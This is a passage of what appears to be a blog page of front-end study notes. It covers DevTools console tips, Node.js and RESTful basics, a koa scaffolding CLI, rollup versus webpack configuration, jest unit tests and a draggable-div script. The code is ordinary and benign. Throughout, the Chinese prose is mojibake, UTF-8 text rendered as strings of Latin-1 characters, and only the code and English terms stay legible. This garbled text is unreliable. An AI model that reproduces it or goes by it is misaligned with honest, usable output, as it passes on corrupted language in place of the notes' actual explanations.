æŸ¥çœ‹æ—¥å¿—ã€‚ï¼ˆåœ¨æ§åˆ¶æ å·¦ä¾§é€‰æ‹©ç­‰çº§ï¼Œå¯¹æ—¥å¿—åˆ†ç±»æŸ¥çœ‹ï¼‰</li><li>console.table å…·è±¡åŒ–å±•ç¤º JSON å’Œæ•°ç»„æ•°æ®ã€‚</li><li>console.dir å±•ç¤º<strong>å¯¹è±¡</strong>ä¸­çš„å±æ€§ä¸å€¼ï¼ˆå¤„ç† DOM èŠ‚ç‚¹ï¼‰ã€‚</li><li>å ä½ç¬¦ï¼šç»™æ—¥å¿—æ·»åŠ æ ·å¼ï¼Œçªå‡ºé‡è¦çš„ä¿¡æ¯ã€‚å¦‚ï¼š<code>console.log(&#39;%c%s&#39;, &#39;font-size:24px; color:red&#39;, &#39;Welcome!&#39;);</code><ul><li>%sï¼šå­—ç¬¦ä¸²å ä½ç¬¦</li><li>%oï¼šå¯¹è±¡å ä½ç¬¦</li><li>%cï¼šæ ·å¼å ä½ç¬¦</li><li>%dï¼šæ•°å­—å ä½ç¬¦</li></ul></li></ul><h3 id="ä¸‰ã€Souces"><a href="#ä¸‰ã€Souces" class="headerlink" title="ä¸‰ã€Souces"></a>ä¸‰ã€Souces</h3><p> åœ¨ç½‘é¡µä¸­è°ƒè¯•ä»£ç çš„æ–¹æ³•ï¼š</p><ul><li>ä»£ç é—´è¾“å…¥ <code>debugger;</code> ç„¶ååœ¨ Souces ä¸­æ‰¾åˆ°å¯¹åº”çš„ js æ–‡ä»¶ï¼Œè‡ªåŠ¨è¿›å…¥è°ƒè¯•ã€‚</li><li>ç‚¹å‡»å·¦è¾¹è¡Œå·ï¼Œå¼€å§‹è°ƒè¯•ã€‚ï¼ˆæµ®æ ‡èƒ½çœ‹æ•°æ®ï¼‰</li><li>å³è¾¹æœ‰å¾ˆå¤šä¿¡æ¯~</li></ul><p> å­¦ä¼šä½¿ç”¨ <a href="https://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html">source-map</a> æ˜ å°„æºç ã€‚</p><h3 id="å››ã€Performance"><a href="#å››ã€Performance" class="headerlink" title="å››ã€Performance"></a>å››ã€Performance</h3><p> <img src="https://i.loli.net/2021/08/17/KLIyzGUJrCA1DBm.png" alt="image.png"></p><h1 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h1><p>â€˜ TS çš„ç±»å‹æ£€æŸ¥â€™ä¸â€˜ç”Ÿæˆ JS â€™æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„è¿‡ç¨‹ï¼›ç±»å‹æ£€æŸ¥å‡ºé”™ä¸å½±å“ç”Ÿæˆ JavaScript ä»£ç ã€‚</p><p><strong>ç±»å‹åˆ«åï¼š</strong>ç”¨ type å£°æ˜ç±»å‹ï¼Œä¸ let ç±»ä¼¼ï¼Œé‡‡ç”¨å—çº§ä½œç”¨åŸŸã€‚ </p><h1 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><ol><li><p>å¼‚æ­¥I/Oï¼šå½“Node,js æ‰§è¡ŒI/O æ“ä½œæ—¶ï¼Œä¼šåœ¨å“åº”è¿”å›å¹¶æ¢å¤æ“ä½œï¼Œè€Œä¸æ˜¯é˜»å¡çº¿ç¨‹å¹¶æµªè´¹CPUå¾ªç¯ç­‰å¾…ã€‚</p></li><li><p>å•çº¿ç¨‹ï¼šNode.jsä¿æŒäº†JavaScriptåœ¨æµè§ˆå™¨ä¸­å•çº¿ç¨‹çš„ç‰¹ç‚¹ã€‚</p><p>ä¼˜ç‚¹:</p><ol><li>ä¸ç”¨å¤„å¤„åœ¨æ„çŠ¶æ€åŒæ­¥é—®é¢˜ï¼Œä¸ä¼šå‘ç”Ÿæ­»é”</li><li>æ²¡æœ‰çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢å¸¦æ¥çš„æ€§èƒ½å¼€é”€</li></ol><p>ç¼ºç‚¹: </p><ol><li>æ— æ³•åˆ©ç”¨å¤šæ ¸CPU</li><li>é”™è¯¯ä¼šå¼•èµ·æ•´ä¸ªåº”ç”¨é€€å‡ºï¼Œå¥å£®æ€§ä¸è¶³</li><li>å¤§é‡è®¡ç®—å ç”¨å¯¼è‡´CPUï¼Œæ— æ³•ç»§ç»­æ‰§è¡Œ</li></ol></li></ol><hr><hr><h1 id="9-20-Node"><a href="#9-20-Node" class="headerlink" title="9.20 Node"></a>9.20 Node</h1><p>è¿™ä¸€éƒ¨åˆ†å±å®å­¦ä¸æ‡‚ã€‚ã€‚è§<a href="https://learn.kaikeba.com/video/464251">https://learn.kaikeba.com/video/464251</a></p><h2 id="NodeåŸºç¡€Api"><a href="#NodeåŸºç¡€Api" class="headerlink" title="NodeåŸºç¡€Api"></a>NodeåŸºç¡€Api</h2><p><strong>æ ¸å¿ƒ API â€”â€”æ— éœ€ require</strong></p><ul><li>buffer</li><li>module</li><li>process</li></ul><p><strong>å†…ç½® API â€”â€”éœ€è¦ require æ— éœ€ install</strong></p><ul><li>os</li><li>fs</li><li>path</li><li>http</li><li>event</li></ul><h2 id="æŒä¹…åŒ–mysql-mongodb-Restfulå®æˆ˜"><a href="#æŒä¹…åŒ–mysql-mongodb-Restfulå®æˆ˜" class="headerlink" title="æŒä¹…åŒ–mysql/mongodb/Restfulå®æˆ˜"></a>æŒä¹…åŒ–mysql/mongodb/Restfulå®æˆ˜</h2><p>æ•°æ®æŒä¹…åŒ–å°±æ˜¯å°†å†…å­˜ä¸­çš„æ•°æ®æ¨¡å‹è½¬æ¢ä¸ºå­˜å‚¨æ¨¡å‹ï¼Œä»¥åŠå°†å­˜å‚¨æ¨¡å‹è½¬æ¢ä¸ºå†…å­˜ä¸­çš„æ•°æ®æ¨¡å‹çš„ç»Ÿç§°ã€‚</p><p>æ•°æ®æ¨¡å‹å¯ä»¥æ˜¯ä»»ä½•æ•°æ®ç»“æ„æˆ–å¯¹è±¡æ¨¡å‹ï¼Œå­˜å‚¨æ¨¡å‹å¯ä»¥æ˜¯å…³ç³»æ¨¡å‹ã€XMLã€ äºŒè¿›åˆ¶æµç­‰ã€‚</p><ul><li>mysql</li><li>mongodb</li><li>é€šè¿‡æ¨¡å‹è‡ªåŠ¨æ˜ å°„RestfulæœåŠ¡</li></ul><h3 id="RestfulæœåŠ¡"><a href="#RestfulæœåŠ¡" class="headerlink" title="RestfulæœåŠ¡"></a>RestfulæœåŠ¡</h3><p>Representational State Transfer ç¿»è¯‘è¿‡æ¥æ˜¯â€è¡¨ç°å±‚çŠ¶æ€è½¬åŒ–â€ï¼Œå®ƒæ˜¯ä¸€ç§äº’è”ç½‘è½¯ä»¶çš„æ¶æ„åŸåˆ™ã€‚å› æ­¤å¤åˆ<br>RESTé£æ ¼çš„Web APIè®¾è®¡ï¼Œå°±ç§°å®ƒä¸ºRESTful API</p><p>RESTfulç‰¹å¾:</p><ul><li>æ¯ä¸€ä¸ªURIä»£è¡¨ä¸€ç§èµ„æº(Resources), æ¯”å¦‚: <code>http://kaikeba.com/courses</code> ; </li><li>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ï¼Œä¼ é€’è¿™ç§èµ„æºçš„æŸç§è¡¨ç°å±‚ï¼Œæ¯”å¦‚ï¼š<code>http://kaikeba.com/courses/web</code>;</li><li>å®¢æˆ·ç«¯é€šè¿‡HTTPåŠ¨è¯ï¼Œå¯¹æœåŠ¡å™¨ç«¯èµ„æºè¿›è¡Œæ“ä½œï¼Œå®ç°â€è¡¨ç°å±‚çŠ¶æ€è½¬åŒ–â€ï¼Œæ¯”å¦‚ï¼š<code>POST http://kaikeba .com/courses</code></li></ul><h2 id="é‰´æƒsession-token-Oauth2-0å®æˆ˜"><a href="#é‰´æƒsession-token-Oauth2-0å®æˆ˜" class="headerlink" title="é‰´æƒsession/token/Oauth2.0å®æˆ˜"></a>é‰´æƒsession/token/Oauth2.0å®æˆ˜</h2><h2 id="rpc-cdn-log-ç›‘æ§"><a href="#rpc-cdn-log-ç›‘æ§" class="headerlink" title="rpc/cdn/log/ç›‘æ§"></a>rpc/cdn/log/ç›‘æ§</h2><h1 id="9-21-å‰ç«¯å·¥ç¨‹åŒ–"><a href="#9-21-å‰ç«¯å·¥ç¨‹åŒ–" class="headerlink" title="9.21 å‰ç«¯å·¥ç¨‹åŒ–"></a>9.21 å‰ç«¯å·¥ç¨‹åŒ–</h1><p><a href="https://learn.kaikeba.com/catalog/223769?type=1">https://learn.kaikeba.com/catalog/223769?type=1</a> ç­‰ä»¥åæœ‰èƒ½åŠ›å†çœ‹ã€‚ã€‚ã€‚</p><h2 id="ä¸€ã€åˆå§‹åŒ–â€”â€”å®ç°-setup-koa-çš„-cli-å·¥å…·"><a href="#ä¸€ã€åˆå§‹åŒ–â€”â€”å®ç°-setup-koa-çš„-cli-å·¥å…·" class="headerlink" title="ä¸€ã€åˆå§‹åŒ–â€”â€”å®ç° setup-koa çš„ cli å·¥å…·"></a>ä¸€ã€åˆå§‹åŒ–â€”â€”å®ç° setup-koa çš„ cli å·¥å…·</h2><p>é€šè¿‡è‡ªå·±å†™ä¸€ä¸ª<strong>è„šæ‰‹æ¶</strong>åˆå§‹åŒ–é¡¹ç›®ï¼Œè§£å†³åˆå§‹åŒ–æ—¶éœ€è¦é‡å¤åŠ è½½ç›¸åŒä¾èµ–çš„é—®é¢˜ã€‚</p><p>æœ€æ ¸å¿ƒæ€ç»´ï¼š<strong>è‡ªåŠ¨åŒ–</strong></p><p>æ¡ˆä¾‹ï¼šå®ç°åŸºäº koa çš„è„šæ‰‹æ¶</p><hr><p>ä»¥é—®é¢˜é©±åŠ¨çš„æ–¹å¼å®ç°ï¼š</p><p>0.ä½¿ç”¨ esm è§„èŒƒï¼Œåœ¨ package.json ä¸­æ·»åŠ  type ä¸º moduleã€‚</p><p>1.æ‰‹åŠ¨åˆ›å»ºéœ€4ä¸ªæ­¥éª¤ï¼Œå› æ­¤åœ¨å…¥å£æ–‡ä»¶ç”¨ä»£ç è§£å†³</p><ul><li><p>åˆ›å»ºæ–‡ä»¶å¤¹ï¼ˆé¡¹ç›®åï¼‰<code>fs.mkdirSync(getRootPath());</code> æ¯æ¬¡è¿è¡Œæ—¶è¦åˆ é™¤åŸæœ‰æ–‡ä»¶å¤¹ï¼Œåœ¨ package.json ä¸­</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;test&quot;</span>: <span class="string">&quot;rimraf ./haha &amp;&amp; node index.js&quot;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li><li><p>åˆ›å»º index.js, é€šè¿‡æ¨¡æ¿æ¸²æŸ“ index.js <code>fs.writeFileSync(getRootPath()+&quot;/index.js&quot;, createIndexTemplate(inputConfig));</code></p></li><li><p>åˆ›å»º Package.json <code>fs.writeFileSync(getRootPath()+&quot;/package.json&quot;, &quot;package.json&quot;);</code></p></li><li><p>å®‰è£…ä¾èµ– <code>// TODO package -&gt; yarn</code></p></li></ul><p>2.ä¸»æµç¨‹æå®šï¼Œç»†åŒ–åˆ†æ”¯ï¼šindexä¸­çš„ä»£ç ç”¨æ¨¡æ¿ï¼ˆ``ï¼‰æ¥æ¸²æŸ“</p><p>3.æ¨¡æ¿åº”è¯¥æ˜¯<strong>åŠ¨æ€</strong>çš„ï¼Œå› æ­¤å¯¼å…¥ejsï¼ˆç”±äºå•ä¸€èŒè´£ï¼Œå› æ­¤åˆ›å»ºæ¨¡æ¿æ–‡ä»¶å¤¹ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨ejsæ–‡ä»¶ä¸­é€šè¿‡ä¼ å‚åŠ¨æ€æ¸²æŸ“</span><br><span class="line">&lt;% if (router) &#123; %&gt;</span><br><span class="line">const Router = require(&quot;koa-router&quot;);</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>4.package.json æ¨¡æ¿æ¸²æŸ“ï¼ˆåŒindex.jsï¼‰</p><p>5.æ”¯æŒç”¨æˆ·å‘½ä»¤è¡Œè¾“å…¥ï¼šåˆ©ç”¨ inquireråº“</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node.jsæ”¯æŒé¡¶å±‚ await</span></span><br><span class="line"><span class="keyword">const</span> answer = <span class="keyword">await</span> inquirer.prompt([</span><br><span class="line">    &#123; <span class="attr">type</span>: <span class="string">&quot;input&quot;</span>, <span class="attr">name</span>: <span class="string">&quot;packageName&quot;</span>, <span class="attr">message</span>: <span class="string">&quot;set package name&quot;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">type</span>: <span class="string">&quot;number&quot;</span>, <span class="attr">name</span>: <span class="string">&quot;port&quot;</span>, <span class="attr">message</span>: <span class="string">&quot;set port number&quot;</span>, <span class="attr">default</span>:<span class="function">()=&gt;</span><span class="number">8080</span>&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;checkbox&quot;</span>,</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;middleware&quot;</span>,</span><br><span class="line">        <span class="attr">choices</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">name</span>: <span class="string">&quot;koaStatic&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">name</span>: <span class="string">&quot;koaRouter&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">        ],</span><br><span class="line">    &#125;,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šï¼Œæ‰€æœ‰åŠŸèƒ½ï¼ˆé™¤å®‰è£…ä¾èµ–ï¼‰å°±å·²ç»å®ç°ï¼š</p><p><strong>ä¼˜åŒ–ï¼š</strong></p><p>1.å°† answer æŠ½ç¦»åˆ° question.jsä¸­</p><p>2.å°† config æŠ½ç¦»åˆ° config.jsä¸­</p><p>3.é€šè¿‡ prettier æ ¼å¼åŒ–ç”Ÿæˆçš„ js æ–‡ä»¶</p><p><strong>å®‰è£…ä¾èµ–ï¼š</strong>ï¼ˆå¯ä»¥é€šè¿‡ spawn å­è¿›ç¨‹æ–¹å¼å®‰è£…ï¼‰</p><p>ä¹Ÿå¯é€šè¿‡ execa åº“å®‰è£…ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">execa(<span class="string">&quot;yarn&quot;</span>, &#123;</span><br><span class="line">    <span class="comment">// è·¯å¾„ä¸å¯¹ï¼Œå› æ­¤é€šè¿‡ cwd æŒ‡å®šè·¯å¾„</span></span><br><span class="line">    <span class="attr">cwd</span>: getRootPath(),</span><br><span class="line">    <span class="comment">// // æ ‡å¿—å­è¿›ç¨‹ç»§æ‰¿äºçˆ¶è¿›ç¨‹è¾“å‡º</span></span><br><span class="line">    <span class="comment">// stdio:[2,2,2],</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>å…¨å±€ä½¿ç”¨è„šæ‰‹æ¶ï¼š</strong></p><p>1.ç›¸å¯¹è·¯å¾„æ”¹ç»å¯¹è·¯å¾„ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; fileURLToPath &#125; <span class="keyword">from</span> <span class="string">&quot;url&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&quot;path&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// esm ä¸‹ä½¿ç”¨ __dirname</span></span><br><span class="line">  <span class="keyword">const</span> __dirname = fileURLToPath(<span class="keyword">import</span>.meta.url);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> template = fs.readFileSync(path.resolve(__dirname, <span class="string">&quot;../template/index.ejs&quot;</span>), <span class="string">&quot;utf-8&quot;</span>).toString();</span><br></pre></td></tr></table></figure><ol start="2"><li>é€šè¿‡ bin å’Œ sheBang:</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// package.json</span></span><br><span class="line"><span class="string">&quot;bin&quot;</span>: <span class="string">&quot;./bin/index.js&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//index.js</span></span><br><span class="line">#!<span class="regexp">/usr/</span>bin/env node</span><br><span class="line"><span class="comment">// sheBang windowsä¸‹ä¸ç”Ÿæ•ˆ</span></span><br></pre></td></tr></table></figure><h2 id="äºŒã€å¼€å‘"><a href="#äºŒã€å¼€å‘" class="headerlink" title="äºŒã€å¼€å‘"></a>äºŒã€å¼€å‘</h2><p>å³ä¸€äº› bundleï¼ˆæ‰“åŒ…å·¥å…·ï¼‰</p><h3 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h3><p>åŸç†ï¼š<strong>é€’å½’åœ°æ„å»ºä¸€ä¸ªä¾èµ–å…³ç³»å›¾(dependency graph)ï¼Œå…¶ä¸­åŒ…å«åº”ç”¨ç¨‹åºéœ€è¦çš„æ¯ä¸ªæ¨¡å—ï¼Œç„¶åå°†æ‰€æœ‰è¿™äº›æ¨¡å—æ‰“åŒ…æˆä¸€ä¸ªæˆ–å¤šä¸ª bundleã€‚</strong></p><p><img src="https://i.loli.net/2021/09/23/FMKtJfrW3TiayH6.png" alt="image.png"></p><h3 id="rollup"><a href="#rollup" class="headerlink" title="rollup"></a>rollup</h3><p>å¤©ç„¶æ”¯æŒ esmï¼Œï¼ˆå¯¼å…¥çš„æ¨¡å—æ²¡ç”¨ï¼Œåˆ™ä¸ä¼šåœ¨ bundle.js ä¸­å‡ºç°ï¼‰</p><p>1ã€åŸç†ï¼šé€šè¿‡ esm ç”Ÿæˆé™æ€ astï¼Œåˆ†æä»£ç å¾—åˆ°æ•°æ®ç»“æ„ï¼Œå†ç”Ÿæˆå¯¹åº”çš„ä»£ç ã€‚<strong>è§£æä»£ç åä¼šå¾—åˆ°å¾ˆå¤šçš„ä¿¡æ¯ï¼ŒåŸºäºè¿™äº›ä¿¡æ¯åšå¤„ç†ï¼Œæ¯”å¦‚åˆå¹¶ä»£ç ï¼Œåˆ å‡ä»£ç ï¼ˆtree-shakingï¼‰ã€‚</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// rollup.config.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">input</span>: <span class="string">&quot;./index.js&quot;</span>,</span><br><span class="line">    <span class="attr">output</span>: &#123;</span><br><span class="line">        <span class="attr">file</span>: <span class="string">&quot;dist/bundle.js&quot;</span>,</span><br><span class="line">        <span class="attr">format</span>:<span class="string">&quot;esm&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2ã€<strong>plugins çš„ç”¨æ³• <code>plugins: [json()]</code>ï¼Œ</strong>æ¯”å¦‚</p><ul><li>è§£æ json ï¼š <code>import json from &quot;@rollup/plugin-json&quot;;</code></li><li>å‹ç¼©ç”Ÿæˆçš„ bundle æ–‡ä»¶ï¼š<code>import &#123;terser&#125; from &#39;rollup-plugin-terser&#39;</code></li></ul><p>ä¸”åœ¨ä¸åŒçš„è¾“å‡ºæ–‡ä»¶ä¸­æ”¯æŒä¸åŒçš„è§„èŒƒã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// rollup.config.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">input</span>: <span class="string">&quot;./index.js&quot;</span>,</span><br><span class="line">    <span class="attr">output</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">file</span>: <span class="string">&quot;dist/bundle.esm.js&quot;</span>,</span><br><span class="line">            <span class="attr">format</span>: <span class="string">&quot;esm&quot;</span>,</span><br><span class="line">            <span class="attr">plugins</span>: [terser()],</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">file</span>: <span class="string">&quot;dist/bundle.cjs.js&quot;</span>,</span><br><span class="line">            <span class="attr">format</span>: <span class="string">&quot;cjs&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment">// ä½¿ç”¨plugins</span></span><br><span class="line">    <span class="attr">plugins</span>: [json()],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>3ã€rollup å¤©ç„¶ä¸è§£æä¾èµ–ï¼Œé‡åˆ°åªæœ‰ commonjs è§„èŒƒçš„åº“ä¹Ÿè§£æä¸äº†</p><h3 id="rollup-å’Œ-webpack-åŒºåˆ«"><a href="#rollup-å’Œ-webpack-åŒºåˆ«" class="headerlink" title="rollup å’Œ webpack åŒºåˆ«"></a>rollup å’Œ webpack åŒºåˆ«</h3><ul><li>å†™åº“æ—¶ rollup æ›´å¥½ï¼ˆå› ä¸ºçº¯ä»£ç ï¼Œä¸éœ€è¦ä»€ä¹ˆèµ„æºï¼‰</li><li>å¼€å‘åº”ç”¨æ—¶ webpackï¼Œå› ä¸ºæœ‰å¾ˆå¤šä¼˜åŒ–å¦‚çƒ­æ›´æ–°ã€devserverâ€¦</li></ul><h3 id="vite"><a href="#vite" class="headerlink" title="vite"></a>vite</h3><p>todo..</p><h2 id="ä¸‰ã€æµ‹è¯•"><a href="#ä¸‰ã€æµ‹è¯•" class="headerlink" title="ä¸‰ã€æµ‹è¯•"></a>ä¸‰ã€æµ‹è¯•</h2><h3 id="å•å…ƒæµ‹è¯•"><a href="#å•å…ƒæµ‹è¯•" class="headerlink" title="å•å…ƒæµ‹è¯•"></a>å•å…ƒæµ‹è¯•</h3><p><code>yarn init -y </code> åå…ˆå®‰è£… jest :<code>yarn add jest @types/jest --dev</code>ã€‚ç„¶åæ–°å»º add.spec.js </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> add = <span class="built_in">require</span>(<span class="string">&quot;./add&quot;</span>);</span><br><span class="line"></span><br><span class="line">test(<span class="string">&quot;should 1 + 1 = 2&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// å‡†å¤‡æµ‹è¯•æ•°æ® -&gt; given</span></span><br><span class="line">    <span class="keyword">const</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> b = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// è§¦å‘æµ‹è¯•åŠ¨ä½œ -&gt; when</span></span><br><span class="line">    <span class="keyword">const</span> r = add(a, b);</span><br><span class="line">    <span class="comment">// éªŒè¯æµ‹è¯•ç»“æœ -&gt; then</span></span><br><span class="line">    expect(r).toBe(<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// jest -&gt; åŒ¹é…å™¨</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å¯¹äºä¸€ä¸ª input ä¸º functionï¼Œoutput ä¸ºï¼š</p><ol><li>return value</li><li>call other function</li><li>change state</li><li>throw error</li></ol><p>å‡½æ•°æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = <span class="built_in">require</span>(<span class="string">&quot;./foo&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bar = <span class="built_in">require</span>(<span class="string">&quot;./bar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// mock</span></span><br><span class="line">jest.mock(<span class="string">&quot;./bar.js&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªfunciton</span></span><br><span class="line">    <span class="keyword">return</span> jest.fn();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">test(<span class="string">&quot;foo&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    foo();</span><br><span class="line">    expect(bar).toHaveBeenCalled();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="ç»„ä»¶æµ‹è¯•"><a href="#ç»„ä»¶æµ‹è¯•" class="headerlink" title="ç»„ä»¶æµ‹è¯•"></a>ç»„ä»¶æµ‹è¯•</h3><p>å€ŸåŠ© cypress è¿›è¡Œç»„ä»¶æµ‹è¯•</p><p>ç”¨ä»£ç æ¨¡æ‹Ÿç”¨æˆ·çš„æ“ä½œè¡Œä¸º</p><h3 id="e2eæµ‹è¯•"><a href="#e2eæµ‹è¯•" class="headerlink" title="e2eæµ‹è¯•"></a>e2eæµ‹è¯•</h3><p>åœ¨æœ€å¤–å±‚ï¼Œæµ‹è¯•æ•´ä¸ªåº”ç”¨ï¼ˆåŒ…å«å¾ˆå¤šç»„ä»¶ï¼‰</p><p><img src="https://i.loli.net/2021/10/03/DSkre5xLGORFI4m.png" alt="image.png"></p><h3 id="git-hook"><a href="#git-hook" class="headerlink" title="git hook"></a>git hook</h3><h3 id="lint-amp-eslint"><a href="#lint-amp-eslint" class="headerlink" title="lint &amp; eslint"></a>lint &amp; eslint</h3><p>è¿™ä¿©çœŸæ²¡å¬æ‡‚ã€‚</p><h2 id="å››ã€åŸºç¡€èƒ½åŠ›"><a href="#å››ã€åŸºç¡€èƒ½åŠ›" class="headerlink" title="å››ã€åŸºç¡€èƒ½åŠ›"></a>å››ã€åŸºç¡€èƒ½åŠ›</h2><h3 id="webpack-loader"><a href="#webpack-loader" class="headerlink" title="webpack loader"></a>webpack loader</h3><p>ç›®çš„ï¼šå› ä¸º webpack æ— æ³•æ‰“åŒ…é js æ–‡ä»¶ï¼Œå¦‚ .mdï¼Œå› æ­¤æ‰‹åŠ¨å®ç°ä¸€ä¸ª loaderï¼Œå°† md -&gt; htmlString</p><h3 id="webpack-plugin"><a href="#webpack-plugin" class="headerlink" title="webpack plugin"></a>webpack plugin</h3><p>æ ¸å¿ƒï¼šåœ¨å¯¹åº”çš„æ—¶æœºåšå¯¹åº”çš„äº‹</p><h1 id="9-22-Webç»„ä»¶"><a href="#9-22-Webç»„ä»¶" class="headerlink" title="9.22 Webç»„ä»¶"></a>9.22 Webç»„ä»¶</h1><p>çˆ¬å–æŸä¸ªç»„ä»¶å®˜ç½‘ä¸Šæ‰€æœ‰ç»„ä»¶åç§°ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">document</span>.querySelectorAll(<span class="string">&quot;#my .v-list-item&quot;</span>)).map(<span class="function"><span class="params">e</span>=&gt;</span>e.innerText).join(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>æ‹–æ‹½ div ä»£ç ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;dragable&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100px;height: 100px; border:solid 1px green&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">enableDrag</span>(<span class="params">element</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> x0, y0;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> ex = <span class="number">0</span>,</span></span><br><span class="line"><span class="javascript">            ey = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> move = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> [dx, dy] = [e.clientX - x0, e.clientY - y0];</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(dx, dy);</span></span><br><span class="line"><span class="javascript">            element.style.transform = <span class="string">`translate(<span class="subst">$&#123;ex + dx&#125;</span>px, <span class="subst">$&#123;ey + dy&#125;</span>px) `</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> up = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.removeEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.removeEventListener(<span class="string">&quot;mouseup&quot;</span>, up);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> [dx, dy] = [e.clientX - x0, e.clientY - y0];</span></span><br><span class="line"><span class="javascript">            ex += dx, ey += dy;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        element.addEventListener(<span class="string">&quot;mousedown&quot;</span>, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            [x0, y0] = [e.clientX, e.clientY];</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mouseup&quot;</span>, up);</span></span><br><span class="line"><span class="javascript">        &#125;);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    enableDrag(<span class="built_in">document</span>.getElementById(<span class="string">&quot;dragable&quot;</span>));</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="9-23-Web-ç§»åŠ¨ç«¯"><a 